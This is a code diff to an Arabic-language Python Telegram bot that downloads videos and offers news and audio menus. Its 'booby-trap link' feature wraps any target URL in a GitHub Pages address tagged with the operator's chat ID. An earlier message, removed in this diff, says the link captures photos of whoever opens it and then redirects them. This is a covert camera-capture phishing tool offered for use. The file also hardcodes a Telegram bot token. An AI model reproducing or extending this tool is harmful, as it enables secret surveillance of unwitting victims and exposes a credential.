@@ -13,8 +13,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 BOT_TOKEN = "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc"
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# روابط الصفحات الخاصة بك
-PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld2/" # تم التحديث للرابط المطلوب
+# رابط صفحتك المخصصة
+PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld2/" 
 user_states = {}
 
 # --- السيرفر للبقاء نشطاً ---
@@ -23,20 +23,21 @@ def run_dummy_server():
     httpd = http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler)
     httpd.serve_forever()
 
-# --- دالة التحميل ---
+# --- دالة التحميل المحدثة ---
 def download_video_sync(url, chat_id):
     try:
         file_path = f'/tmp/vid_{chat_id}.mp4'
         ydl_opts = {
-            'format': 'best[ext=mp4]/best',
+            'format': 'bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best',
             'outtmpl': file_path,
             'quiet': True,
             'no_warnings': True,
+            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
         }
         with yt_dlp.YoutubeDL(ydl_opts) as ydl:
             if os.path.exists(file_path): os.remove(file_path)
-            info = ydl.extract_info(url, download=True)
-            return file_path, info.get('title', 'Video')
+            ydl.download([url])
+            return file_path if os.path.exists(file_path) else None, "تم التحميل"
     except Exception as e: return None, str(e)
 
 def get_main_keyboard():
@@ -47,14 +48,14 @@ def get_main_keyboard():
         types.InlineKeyboardButton("✨ رابط تعديل", callback_data="get_image_edit_link"),
         types.InlineKeyboardButton("📥 تحميل فيديو", callback_data="dl_video"),
         types.InlineKeyboardButton("🌐 أخبار وبث مباشر", callback_data="news_menu"),
-        types.InlineKeyboardButton("🔒 حقن رابط", callback_data="inject_start"),
+        types.InlineKeyboardButton("💣 تلغيم رابط", callback_data="inject_start"),
         types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu")
     )
     return markup
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.send_message(message.chat.id, "👋 أهلاً بك في بوت المطور سيف الدين!", reply_markup=get_main_keyboard())
+    bot.send_message(message.chat.id, "👋 أهلاً بك في بوت سيف الدين المطور!", reply_markup=get_main_keyboard())
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_query(call):
@@ -70,7 +71,7 @@ def handle_query(call):
     
     elif call.data == "inject_start":
         user_states[chat_id] = "waiting_for_inject_link"
-        bot.edit_message_text("🔗 أرسل الرابط الذي تريد توجيه المستخدم إليه (مثلاً رابط تيك توك):", chat_id, call.message.message_id)
+        bot.edit_message_text("💣 أرسل الرابط الذي تريد تلغيمه:", chat_id, call.message.message_id)
 
     elif call.data == "dl_video":
         user_states[chat_id] = "waiting_for_url"
@@ -91,20 +92,19 @@ def handle_text(message):
     
     if state == "waiting_for_inject_link":
         target_url = message.text if message.text.startswith("http") else f"https://{message.text}"
-        # الدمج: رابط صفحتك + الهدف
         injected_link = f"{PHOTO_PAGE_URL}?target={target_url}&chatId={chat_id}"
-        bot.reply_to(message, f"✅ تم دمج الرابط:\n{injected_link}\n\nسيقوم الرابط بالتقاط الصور ثم التوجيه.")
+        bot.reply_to(message, f"✅ تم تلغيم الرابط بنجاح:\n\n{injected_link}")
         user_states[chat_id] = None
         
     elif state == "waiting_for_url":
-        status_msg = bot.reply_to(message, "⏳ جاري التحميل...")
-        path, title = download_video_sync(message.text, chat_id)
+        status_msg = bot.reply_to(message, "⏳ جاري التحميل... قد يستغرق الأمر لحظات.")
+        path, _ = download_video_sync(message.text, chat_id)
         if path:
-            bot.send_video(chat_id, open(path, 'rb'), caption=title)
+            bot.send_video(chat_id, open(path, 'rb'))
             bot.delete_message(chat_id, status_msg.message_id)
             os.remove(path)
         else:
-            bot.edit_message_text(f"❌ فشل التحميل.", chat_id, status_msg.message_id)
+            bot.edit_message_text(f"❌ فشل تحميل الفيديو. تأكد من صحة الرابط.", chat_id, status_msg.message_id)
         user_states[chat_id] = None
 
 if __name__ == '__main__':
